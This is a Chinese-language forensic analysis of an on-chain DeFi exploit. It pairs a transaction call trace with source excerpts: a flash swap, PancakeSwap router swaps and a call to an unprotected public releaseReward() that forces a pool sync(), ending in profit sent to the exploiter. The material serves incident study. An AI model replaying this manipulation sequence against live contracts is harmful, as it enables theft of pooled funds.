# 关键函数调用与代码映射

> **分析范围**: 攻击者直接调用 + 攻击合约调用外部 + 受害者合约被调用

> **攻击者创建的合约**: 2 个
>   - `0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5`
>   - `0x486da49a56b564b824ea140fa4a5ff74de6cf34b`

## Trace
```text
[1] CREATE 0x486da4...6cf34b -> 0x1e70f1...2291e5 ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=803747, value=0

[6] CALL 0x486da4...6cf34b -> 0x1e70f1...2291e5 :: _attack() ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=511530, value=0

[8] STATICCALL 0x1e70f1...2291e5 -> 0xd3c304...b1631a(GPC) :: balanceOf(address) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=2940, value=0
      args: account:address=0xe3cba5c0a8efaedce84751af2efddcf071d311a9

[33] STATICCALL 0x1e70f1...2291e5 -> 0xd3c304...b1631a(GPC) :: balanceOf(address) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=940, value=0
      args: account:address=0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5

[13] CALL 0x1e70f1...2291e5 -> 0xe3cba5...d311a9(0xe3cb_Cake-LP) :: swap(uint256,uint256,address,bytes) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=457537, value=0
      args: amount0Out:uint256=0, amount1Out:uint256=46,841,803,215,322,280,406,440,238, to:address=0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5, data:bytes=0x00

[26] CALL 0x1e70f1...2291e5 -> 0xd3c304...b1631a(GPC) :: approve(address,uint256) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=27540, value=0
      args: spender:address=0x10ed43c718714eb63d5aa57b78b54704e256024e, value:uint256=115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935

[30] CALL 0x1e70f1...2291e5 -> 0xbb4cdb...bc095c(WBNB) :: approve(address,uint256) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=24420, value=0
      args: guy:address=0x10ed43c718714eb63d5aa57b78b54704e256024e, wad:uint256=115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935

[35] CALL 0x1e70f1...2291e5 -> 0x10ed43...56024e(PancakeSwap: Router v2) :: swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=88627, value=0
      args: amountIn:uint256=46,841,803,215,322,280,406,440,238, amountOutMin:uint256=0, path:address[]=['0xd3c304697f63b279cd314f92c19cdbe5e5b1631a', '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c'], to:address=0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5, deadline:uint256=1,766,984,382

[82] STATICCALL 0x1e70f1...2291e5 -> 0x713630...6425cc(MSC) :: balanceOf(address) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=2910, value=0
      args: account:address=0x91334d03dd9b9de8d48b50fe389337eeb759aeb1

[84] CALL 0x1e70f1...2291e5 -> 0x91334d...59aeb1(MSCST) :: releaseReward(uint256) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=143280, value=0
      args: fee:uint256=13,329,580,007,446,108,335,195,360

[183] STATICCALL 0x1e70f1...2291e5 -> 0xbb4cdb...bc095c(WBNB) :: balanceOf(address) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=534, value=0
      args: :address=0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5

[230] STATICCALL 0x1e70f1...2291e5 -> 0xbb4cdb...bc095c(WBNB) :: balanceOf(address) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=534, value=0
      args: :address=0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5

[186] CALL 0x1e70f1...2291e5 -> 0x10ed43...56024e(PancakeSwap: Router v2) :: swapTokensForExactTokens(uint256,uint256,address[],address,uint256) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=52012, value=0
      args: amountOut:uint256=46,959,201,218,368,200,908,712,019, amountInMax:uint256=205,635,720,265,951,753,886, path:address[]=['0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c', '0xd3c304697f63b279cd314f92c19cdbe5e5b1631a'], to:address=0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5, deadline:uint256=1,766,984,382

[224] CALL 0x1e70f1...2291e5 -> 0xd3c304...b1631a(GPC) :: transfer(address,uint256) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=3895, value=0
      args: to:address=0xe3cba5c0a8efaedce84751af2efddcf071d311a9, value:uint256=46,959,201,218,368,200,908,712,019

[232] CALL 0x1e70f1...2291e5 -> 0xbb4cdb...bc095c(WBNB) :: transfer(address,uint256) ⚠️ (攻击合约调用外部)
      status=OK, gasUsed=25162, value=0
      args: dst:address=0xb0720d8541cd2b6fc35ccc39ec84e84383a7000b, wad:uint256=149,743,967,145,038,025,112

[0] CREATE 0xb0720d...a7000b(Unidentified Exploiter) -> 0x486da4...6cf34b ⚠️ (攻击者直接调用)
      status=OK, gasUsed=1441528, value=0

[45] STATICCALL 0x10ed43...56024e(PancakeSwap: Router v2) -> 0x12dabf...8d64d9(0x12da_Cake-LP) :: getReserves() ⚠️ (受害者合约被调用)
      status=OK, gasUsed=2893, value=0

[187] STATICCALL 0x10ed43...56024e(PancakeSwap: Router v2) -> 0x12dabf...8d64d9(0x12da_Cake-LP) :: getReserves() ⚠️ (受害者合约被调用)
      status=OK, gasUsed=893, value=0

[49] CALL 0x10ed43...56024e(PancakeSwap: Router v2) -> 0x12dabf...8d64d9(0x12da_Cake-LP) :: swap(uint256,uint256,address,bytes) ⚠️ (受害者合约被调用)
      status=OK, gasUsed=62748, value=0
      args: amount0Out:uint256=205,635,720,265,951,753,886, amount1Out:uint256=0, to:address=0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5, data:bytes=0x

[197] CALL 0x10ed43...56024e(PancakeSwap: Router v2) -> 0x12dabf...8d64d9(0x12da_Cake-LP) :: swap(uint256,uint256,address,bytes) ⚠️ (受害者合约被调用)
      status=OK, gasUsed=39297, value=0
      args: amount0Out:uint256=0, amount1Out:uint256=46,959,201,218,368,200,908,712,019, to:address=0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5, data:bytes=0x

[144] CALL 0x91334d...59aeb1(MSCST) -> 0x12dabf...8d64d9(0x12da_Cake-LP) :: sync() ⚠️ (受害者合约被调用)
      status=OK, gasUsed=9386, value=0

```

## Code
### unknown()
**合约地址:** `0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5`
**调用类型:** 攻击合约调用外部

```text
未找到函数定义位置
```

### _attack()
**合约地址:** `0x1e70f17d4e9db9341af7fc6a8ffcdcb2a52291e5`
**调用类型:** 攻击合约调用外部

```text
未找到函数定义位置
```

### balanceOf(address)
**合约地址:** `0xd3c304697f63b279cd314f92c19cdbe5e5b1631a`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `AMMToken.sol`

```solidity
 391 |     function balanceOf(address account) public view virtual returns (uint256) {
 392 |         return _balances[account];
 393 |     }
```

### swap(uint256,uint256,address,bytes)
**合约地址:** `0xe3cba5c0a8efaedce84751af2efddcf071d311a9`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `PancakePair.sol`

```solidity
 456 |     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
 457 |         require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');
 458 |         (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
 459 |         require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');
 460 | 
 461 |         uint balance0;
 462 |         uint balance1;
 463 |         { // scope for _token{0,1}, avoids stack too deep errors
 464 |         address _token0 = token0;
 465 |         address _token1 = token1;
 466 |         require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');
 467 |         if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
 468 |         if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
 469 |         if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
 470 |         balance0 = IERC20(_token0).balanceOf(address(this));
 471 |         balance1 = IERC20(_token1).balanceOf(address(this));
 472 |         }
 473 |         uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
 474 |         uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
 475 |         require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');
 476 |         { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
 477 |         uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));
 478 |         uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));
 479 |         require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');
 480 |         }
 481 | 
 482 |         _update(balance0, balance1, _reserve0, _reserve1);
 483 |         emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
 484 |     }
```

### approve(address,uint256)
**合约地址:** `0xd3c304697f63b279cd314f92c19cdbe5e5b1631a`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `AMMToken.sol`

```solidity
 799 |     function approve(address spender, uint256 value)
 800 |         public
 801 |         override
 802 |         returns (bool)
 803 |     {
 804 |         require(finished || spender == owner());
 805 |         address owner = _msgSender();
 806 |         _approve(owner, spender, value);
 807 |         return true;
 808 |     }
```

### approve(address,uint256)
**合约地址:** `0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `WBNB.sol`

```solidity
  38 |     function approve(address guy, uint wad) public returns (bool) {
  39 |         allowance[msg.sender][guy] = wad;
  40 |         Approval(msg.sender, guy, wad);
  41 |         return true;
  42 |     }
```

### swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)
**合约地址:** `0x10ed43c718714eb63d5aa57b78b54704e256024e`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `PancakeRouter.sol`

```solidity
 722 |     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
 723 |         uint amountIn,
 724 |         uint amountOutMin,
 725 |         address[] calldata path,
 726 |         address to,
 727 |         uint deadline
 728 |     ) external virtual override ensure(deadline) {
 729 |         TransferHelper.safeTransferFrom(
 730 |             path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn
 731 |         );
 732 |         uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);
 733 |         _swapSupportingFeeOnTransferTokens(path, to);
 734 |         require(
 735 |             IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,
 736 |             'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT'
 737 |         );
 738 |     }
```

### balanceOf(address)
**合约地址:** `0x713630359cc9046869ad1642a7b61c23956425cc`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `ERC20.sol`

```solidity
 101 |     function balanceOf(address account) public view virtual override returns (uint256) {
 102 |         return _balances[account];
 103 |     }
```

### releaseReward(uint256)
**合约地址:** `0x91334d03dd9b9de8d48b50fe389337eeb759aeb1`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `MorningStar.sol`

```solidity
 325 |     function releaseReward(uint256 fee) public{
 326 | 
 327 |         uint256 burnFee = fee/2;
 328 |         uint256 profitFee = fee-burnFee;
 329 |         swapTokenForGPC(burnFee,uniswapV2PairGpc);
 330 |         IPancakePair(uniswapV2PairGpc).sync(); 
 331 |         IERC20(msc).safeTransfer(profit,profitFee);   
 332 |     }
```

### balanceOf(address)
**合约地址:** `0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `WBNB.sol`

```solidity
  17 |     mapping (address => uint)                       public  balanceOf;
```

### swapTokensForExactTokens(uint256,uint256,address[],address,uint256)
**合约地址:** `0x10ed43c718714eb63d5aa57b78b54704e256024e`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `PancakeRouter.sol`

```solidity
 621 |     function swapTokensForExactTokens(
 622 |         uint amountOut,
 623 |         uint amountInMax,
 624 |         address[] calldata path,
 625 |         address to,
 626 |         uint deadline
 627 |     ) external virtual override ensure(deadline) returns (uint[] memory amounts) {
 628 |         amounts = PancakeLibrary.getAmountsIn(factory, amountOut, path);
 629 |         require(amounts[0] <= amountInMax, 'PancakeRouter: EXCESSIVE_INPUT_AMOUNT');
 630 |         TransferHelper.safeTransferFrom(
 631 |             path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]
 632 |         );
 633 |         _swap(amounts, path, to);
 634 |     }
```

### transfer(address,uint256)
**合约地址:** `0xd3c304697f63b279cd314f92c19cdbe5e5b1631a`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `AMMToken.sol`

```solidity
 403 |     function transfer(address to, uint256 value) public virtual returns (bool) {
 404 |         address owner = _msgSender();
 405 |         _transfer(owner, to, value);
 406 |         return true;
 407 |     }
```

### transfer(address,uint256)
**合约地址:** `0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c`
**调用类型:** 攻击合约调用外部

**函数定义文件:** `WBNB.sol`

```solidity
  44 |     function transfer(address dst, uint wad) public returns (bool) {
  45 |         return transferFrom(msg.sender, dst, wad);
  46 |     }
```

### unknown()
**合约地址:** `0x486da49a56b564b824ea140fa4a5ff74de6cf34b`
**调用类型:** 攻击者直接调用

```text
未找到函数定义位置
```

### getReserves()
**合约地址:** `0x12dabfce08ef59c24cdee6c488e05179fb8d64d9`
**调用类型:** 受害者合约被调用

**函数定义文件:** `PancakePair.sol`

```solidity
 335 |     function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
 336 |         _reserve0 = reserve0;
 337 |         _reserve1 = reserve1;
 338 |         _blockTimestampLast = blockTimestampLast;
 339 |     }
```

**调用位置:** `PancakeRouter.sol` (行 712-712)

```solidity
 712 |             (uint reserve0, uint reserve1,) = pair.getReserves();
```

### swap(uint256,uint256,address,bytes)
**合约地址:** `0x12dabfce08ef59c24cdee6c488e05179fb8d64d9`
**调用类型:** 受害者合约被调用

**函数定义文件:** `PancakePair.sol`

```solidity
 456 |     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
 457 |         require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');
 458 |         (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
 459 |         require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');
 460 | 
 461 |         uint balance0;
 462 |         uint balance1;
 463 |         { // scope for _token{0,1}, avoids stack too deep errors
 464 |         address _token0 = token0;
 465 |         address _token1 = token1;
 466 |         require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');
 467 |         if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
 468 |         if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
 469 |         if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
 470 |         balance0 = IERC20(_token0).balanceOf(address(this));
 471 |         balance1 = IERC20(_token1).balanceOf(address(this));
 472 |         }
 473 |         uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
 474 |         uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
 475 |         require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');
 476 |         { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
 477 |         uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));
 478 |         uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));
 479 |         require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');
 480 |         }
 481 | 
 482 |         _update(balance0, balance1, _reserve0, _reserve1);
 483 |         emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
 484 |     }
```

**调用位置:** `PancakeRouter.sol` (行 719-719)

```solidity
 719 |             pair.swap(amount0Out, amount1Out, to, new bytes(0));
```

### sync()
**合约地址:** `0x12dabfce08ef59c24cdee6c488e05179fb8d64d9`
**调用类型:** 受害者合约被调用

**函数定义文件:** `PancakePair.sol`

```solidity
 495 |     function sync() external lock {
 496 |         _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
 497 |     }
```

**调用位置:** `MorningStar.sol` (行 330-330)

```solidity
 330 |         IPancakePair(uniswapV2PairGpc).sync(); 
```
